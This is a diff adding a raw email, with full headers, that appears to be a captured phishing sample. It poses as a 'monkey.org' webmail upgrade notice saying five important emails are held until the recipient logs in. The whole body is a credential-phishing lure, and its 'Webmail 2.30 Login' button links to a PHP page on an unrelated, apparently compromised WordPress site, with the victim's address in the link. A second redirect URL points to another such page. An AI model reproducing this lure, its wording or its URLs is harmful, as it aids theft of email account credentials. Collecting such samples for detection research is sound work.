@@ -1,0 +1,179 @@
+Return-Path: rhea@manhuasao.com
+Delivered-To: jose@monkey.org
+X-FDA: 83826307782.20.151F37A
+Received: from dully.manhuasao.com (dully.manhuasao.com [86.106.104.242])
+	by imf06.b.hostedemail.com (Postfix) with ESMTP id E3A77C0005
+	for <jose@monkey.org>; Thu, 28 Aug 2025 13:53:09 +0000 (UTC)
+Authentication-Results: imf06.b.hostedemail.com;
+	dkim=pass header.d=manhuasao.com header.s=dkim header.b=IocEwLCA;
+	spf=pass (imf06.b.hostedemail.com: domain of rhea@manhuasao.com designates
+ 86.106.104.242 as permitted sender) smtp.mailfrom=rhea@manhuasao.com;
+	dmarc=pass (policy=none) header.from=manhuasao.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1756389190;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=z9pbDeFf1sAqCXUvpOz48KI8SMhDDrzSVu0k2m9ZNik=;
+	b=xkyMn3Cq+VpJVfkSFp8XEcPHkbpwGVWm3+iW+OSY4CBNuwWQIwk3dxHMRtlwUMc6jlb4eZ
+	NTO8b6a2dcvSxFlFEKGjuAZRY5BXsoJcVPwlu7kWOyMjZFsaI3dXTdTGF4x3bEo+bUDGNq
+	m4ueLB87vaT8xwAClP9JqVej76VCtus=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1756389190; a=rsa-sha256;
+	cv=none;
+	b=raxFnaaCD/2qzZ6/bf6Oj+zcXimqrf3gPe8/+qW+uOSanSGD9I01fPJkzn+oQPQiyIafJu
+	uPilweyOyN06rR/F5fx1R/X2TJwwvE86FCLzQ5zcgVoLcHWXwtT2LYVUI+FMh9KfeOK66U
+	mzOikw+tmuo37bOJwURN9zxOpVkDk2Q=
+ARC-Authentication-Results: i=1;
+	imf06.b.hostedemail.com;
+	dkim=pass header.d=manhuasao.com header.s=dkim header.b=IocEwLCA;
+	spf=pass (imf06.b.hostedemail.com: domain of rhea@manhuasao.com designates
+ 86.106.104.242 as permitted sender) smtp.mailfrom=rhea@manhuasao.com;
+	dmarc=pass (policy=none) header.from=manhuasao.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=manhuasao.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=rhea@manhuasao.com;
+ bh=MEK1rYnRo4Jf57cBuHImXBYUePA=;
+ b=IocEwLCAb9yZq8gSnRjrGOZniyvHzLM29RTcLmb/mdhKhRGCzkktL8a4fyXwIG0Zz/gh94KwrnCE
+   JOgF/t7uvv9GzNUitd/veLUWCR9qVRa1iioJBXaWu4M1HqiSNBaoC40L9fgMvvJ+L83S/SsnljRz
+   xTAXbZsQjEnyVYciznZbx5Xd+66qkfEY2XBtpnebrGUEJWPKbIFbQjyMlKJlEzA4fwOPRipgv3eH
+   aIOhOrvHLQRywlbyq5h1rykwy9gwLPR+8FNMLLn3KwFl7VAIEb9iRlvCma/PWyFtHSRaLtuft36H
+   HCWYJIvShm0vo92gGIFekhDtW5YBPBnOJap62w==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=manhuasao.com;
+ b=KOtMcD92me7ums17RlCe5sReOoRhmEUuq2wNm1pLPnIXDY0jQHP/3evd8JB8fBB4jJTCp/k4UiLR
+   FyS6/A9plum4FeuFggaV3MCkCJOLG4Cr78PvD9R99oZVhan3F4jmI2uKsAO4rfSFAC1ZL9kzmUBV
+   f2RqEMlmbC9x+H+wbtycX8QhLTyHTiTfLVxC60GPw2+OmeV1Te6J17BFJPxwUWj1zSEfvm+QoAtQ
+   SsfA59EesdpgvrhQ8fOwCzZtv/UE3qxdK3XjaUta8M8KyT96Y3JICgcVAdOGhqq16yUkBmTXkT1+
+   NJHW3SyiAEcF93FCWSh2+3CMBl/RDBsQpZVmWw==;
+From: monkey.org <rhea@manhuasao.com>
+To: jose@monkey.org
+Subject: New Webmail Version for jose@monkey.org
+Date: 28 Aug 2025 10:44:59 +0200
+Message-ID: <20250828104459.5414175D4D6ADD62@manhuasao.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: E3A77C0005
+X-Stat-Signature: 7eb9ufq561983txwbhgf9o7dtxpzimm1
+X-Rspam-User: 
+X-Spam-Status: No, score=8.43
+X-HE-Tag: 1756389189-664218
+X-HE-Meta: 
+ U2FsdGVkX195eQBsT7q3/9twS5DdQGb+1YslaPBN+K1dIRP+wAwVPJdCyjoJnwd58gCZyqazhKDouMYhgOrvDXEU/rBmWXchtwehF3t4pQE4z4QgJtkV15qPnYu666Bdh1E6JkkkR6UC9xDtPZrlpy+jYpBMaHMcM1gKbd+haXYRiI57xyRF8lDkErn+cm3HZtDX4PvQrqOo/o4IVbQjjVgsBfzqveI9eYR0UayVU7K+tin/1To8915te0YI2Sd/ArgDfyf3pKSWglUhzTe3eIaXNR9gfSRABaepUj7ItwNA61Zh0tbwYlAAkGG2RAipcGj17mbBjMg1LzUVFTVkiLxPe7Z7LKVXwzcGYOFTuS4av56buJymNAVWI2Z1C207c0G0YO2MhfCQPIbHVrPL8H0fZfnBFp7r7cBK1Ey4qCrooHs+stlVN2aiwT1cQLqfz/i6FJNoJBtAF/MupE4eiSFDtqzhqXymrxU134WqSsymI1TbvF+o2yxtg/sAs87V2VkjJ4nVx821ff+E1f215qmDXuXNlxAfC5jCPvYeUhgw42Y4bVz/lRoas2JmARbhVf9Ad7gs55f/QAJ7C7HHVyAgEt9TbI+00/qr6z8cypgDszIeKf3jZUieC73nT50fuZk93qaz1Z21ik0BGUI17ju3s3OYa0U2aG/OPwcBoXt9EowqQixhkAsihrcHlOhcWMdsTg7M8tW7HzDVTo1LMh86d+A6ts2riNo2mOw6G+xEc96NpHfrz3luwVpPRZjzKVJy5HJ1f2ZONa9Z9gYMI160M3X0O5IiW0ej6mIVDRG4dzU/C/OyzIXcG0Eb0Kbkl3D/ipZg9vNNk0n4FIhFz8eBpQ1C3XZ8ZE4EpjsZrb3u5FA4o4k0Bl1comZu2SjAFPj/RsiciLw0WhWzowoO2jkq/Iat24D1QwxC+X54KrizgjSgdy7MXEkLlWGezVb/HQ60vOg584BKnBlLgo83o2dfiJo
+ rjGhKPMG+MT6OncoA1/JlE21p3AAjqdgHSFQlQsFtJz05NAkYjYrkzLbAl22zTAH5fkmRU1f7GF12bV6wywSQ0/MSiFVH221kI4ZMrWDh1dvWFrKelbwsTG6ta9h90UMzv32/MGcl76ez+N4ibBk9xuBssRIV7w6IStAn/9XaOHLP47fxkHuDnoEljgKOxhM+v5CgCVRxJCXIfSY=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 345
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div style=3D'background: rgb(30, 77, 120); margin: 0px; padding: 13px 0px =
+10px; text-align: center; color: rgb(255, 255, 255); text-transform: none; =
+text-indent: 0px; letter-spacing: 0.3px; font-family: Inter, "Segoe UI", Ro=
+boto, Oxygen, Ubuntu, sans-serif; font-size: 1.05em; font-style: normal; fo=
+nt-weight: 600; word-spacing: 0px; white-space: normal; box-sizing: content=
+-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-c=
+aps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;'><br>monkey.org&nbsp;- New Webmail Version<br styl=
+e=3D"margin: 0px; padding: 0px; box-sizing: content-box;"></div>
+<div style=3D'background: rgb(30, 77, 120); margin: 0px; padding: 13px 0px =
+10px; text-align: center; color: rgb(255, 255, 255); text-transform: none; =
+text-indent: 0px; letter-spacing: 0.3px; font-family: Inter, "Segoe UI", Ro=
+boto, Oxygen, Ubuntu, sans-serif; font-size: 1.05em; font-style: normal; fo=
+nt-weight: 600; word-spacing: 0px; white-space: normal; box-sizing: content=
+-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-c=
+aps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;'><br style=3D"margin: 0px; padding: 0px; box-sizin=
+g: content-box;"></div>
+<div style=3D'margin: 0px; padding: 19px 20px 6px; color: rgb(51, 51, 68); =
+text-transform: none; text-indent: 0px; letter-spacing: normal; font-family=
+: Inter, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif; font-size: 0.98em;=
+ font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norm=
+al; box-sizing: content-box; orphans: 2; widows: 2; background-color: rgb(2=
+55, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -=
+webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;'><div style=3D'margin: 0px 0px 10px; padding: 0px;=
+ font-family: Inter, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif; box-si=
+zing: content-box;'>Email:&nbsp;jose@monkey.org<br style=3D"margin: 0px; pa=
+dding: 0px; box-sizing: content-box;">
+Domain:<span style=3D'margin: 0px; padding: 0px; color: rgb(25, 42, 62); fo=
+nt-family: Inter, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif; font-weig=
+ht: 600; box-sizing: content-box;'>&nbsp;monkey.org</span><br style=3D"marg=
+in: 0px; padding: 0px; box-sizing: content-box;">Title:&nbsp;<span style=3D=
+'margin: 0px; padding: 0px; color: rgb(25, 42, 62); font-family: Inter, "Se=
+goe UI", Roboto, Oxygen, Ubuntu, sans-serif; font-weight: 600; box-sizing: =
+content-box;'><span>&nbsp;</span>
+Important emails are suspended on the server.</span><br style=3D"margin: 0p=
+x; padding: 0px; box-sizing: content-box;"><br style=3D"margin: 0px; paddin=
+g: 0px; box-sizing: content-box;"></div><hr style=3D'background: linear-gra=
+dient(90deg, rgb(238, 242, 247) 0%, rgb(217, 224, 234) 100%); border-width:=
+ 0px; border-color: currentColor; margin: 12px 0px 18px; padding: 0px; heig=
+ht: 1px; font-family: Inter, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif=
+; box-sizing: content-box;'>
+<div style=3D'margin: 0px 0px 12px; padding: 0px; font-family: Inter, "Sego=
+e UI", Roboto, Oxygen, Ubuntu, sans-serif; box-sizing: content-box;'>Webmai=
+l version 2.30 is now available for jose@monkey.org Email Server.<br style=
+=3D"margin: 0px; padding: 0px; box-sizing: content-box;"><br style=3D"margi=
+n: 0px; padding: 0px; box-sizing: content-box;">5&nbsp;new incoming email(s=
+) marked as important are pending on the monkey.org server.</div>
+<div style=3D'margin: 0px 0px 12px; padding: 0px; font-family: Inter, "Sego=
+e UI", Roboto, Oxygen, Ubuntu, sans-serif; box-sizing: content-box;'>Please=
+ log in using the new version to retrieve emails that are&nbsp;held on the =
+server.</div><br style=3D"margin: 0px; padding: 0px; box-sizing: content-bo=
+x;"><div style=3D'margin: 0px; padding: 0px; text-align: center; font-famil=
+y: Inter, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif; box-sizing: conte=
+nt-box;'>
+<a style=3D"background: rgb(34, 105, 161); margin: 0px; padding: 10px 28px;=
+ border-radius: 0px; border: 1px solid rgb(34, 105, 161); color: rgb(255, 2=
+55, 255); font-family: Arial, Helvetica, sans-serif; font-size: 16px; font-=
+weight: 600; text-decoration: none; display: inline-block; box-sizing: cont=
+ent-box;" href=3D"https://cheshiremaintenance.com/wp-includes/ssl/aadd.php#=
+jose@monkey.org" target=3D"_blank"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://capitalgate.p=
+s/wp-content/rec.php%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D175=
+6290331792000&amp;usg=3DAOvVaw1li6g4YDeFQYoGbarejwd5">Webmail 2.30 Login</a=
+><br style=3D"margin: 0px; padding: 0px; box-sizing: content-box;"></div><b=
+r style=3D"margin: 0px; padding: 0px; box-sizing: content-box;"></div>
+<div style=3D'margin: 0px; padding: 19px 20px 6px; color: rgb(51, 51, 68); =
+text-transform: none; text-indent: 0px; letter-spacing: normal; font-family=
+: Inter, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif; font-size: 0.98em;=
+ font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norm=
+al; box-sizing: content-box; orphans: 2; widows: 2; background-color: rgb(2=
+55, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -=
+webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;'>Note: This is only required once. You will receiv=
+e your pending emails 30 minutes after successful login.<br style=3D"margin=
+: 0px; padding: 0px; box-sizing: content-box;"></div>
+<div style=3D'margin: 0px; padding: 19px 20px 6px; color: rgb(51, 51, 68); =
+text-transform: none; text-indent: 0px; letter-spacing: normal; font-family=
+: Inter, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif; font-size: 0.98em;=
+ font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norm=
+al; box-sizing: content-box; orphans: 2; widows: 2; background-color: rgb(2=
+55, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; -=
+webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;'><br style=3D"margin: 0px; padding: 0px; box-sizin=
+g: content-box;"></div>
+<div style=3D'background: rgb(249, 250, 252); margin: 6px 0px 0px; padding:=
+ 9px 20px 8px; color: rgb(125, 152, 179); text-transform: none; text-indent=
+: 0px; letter-spacing: normal; font-family: Inter, "Segoe UI", Roboto, Oxyg=
+en, Ubuntu, sans-serif; font-size: 0.92em; font-style: normal; font-weight:=
+ 400; word-spacing: 0px; border-top-color: rgb(229, 236, 244); border-top-w=
+idth: 1px; border-top-style: solid; white-space: normal; box-sizing: conten=
+t-box; orphans: 2; widows: 2;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;'><span style=3D'margin: 0px; paddi=
+ng: 0px; font-family: Inter, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif=
+; font-weight: 600; box-sizing: content-box;'>monkey.org&nbsp;Webmail &copy=
+; 2025 | All rights reserved.</span></div></body></html>
+
